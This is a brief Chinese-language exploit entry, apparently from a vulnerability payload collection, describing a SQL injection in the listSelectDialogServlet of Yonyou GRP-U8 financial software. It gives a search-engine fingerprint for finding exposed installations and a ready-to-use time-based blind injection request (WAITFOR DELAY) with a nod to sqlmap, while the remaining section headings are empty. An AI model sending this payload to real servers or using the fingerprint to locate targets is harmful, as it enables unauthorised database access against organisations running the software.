# 用友GRP-U8listSelectDialogServlet存在sql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`

**请求体 / payload**
```
/listSelectDialogServlet?slType=slFZX&slCdtn=1=2;WAITFOR DELAY '0:0:5'--

sqlmap\
```

**其他**
- 用友 GRP-U8 listSelectDialogServlet 存在 sql 注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8